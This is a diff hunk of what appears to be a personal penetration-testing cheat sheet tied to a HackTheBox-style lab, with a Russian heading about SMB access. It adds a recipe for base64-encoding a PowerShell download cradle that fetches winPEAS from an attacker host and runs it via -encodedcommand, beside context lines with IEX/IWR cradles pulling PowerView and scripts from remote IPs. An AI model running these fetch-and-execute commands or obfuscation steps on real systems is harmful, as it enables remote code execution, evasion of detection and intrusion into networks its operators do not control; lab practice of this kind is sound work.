@@ -65,6 +65,15 @@ Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {Objec
     IEX(IWR('10.10.10.10/script.ps1'))
 
     iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)
+
+    -----------
+
+echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1')" | iconv -t UTF-16LE| base64 -w0
+
+
+powershell -encodedcommand ACkACgA=
+
+    
 # Доступ к ресурсу SMB
 
 Get-Content //10.10.14.4/file
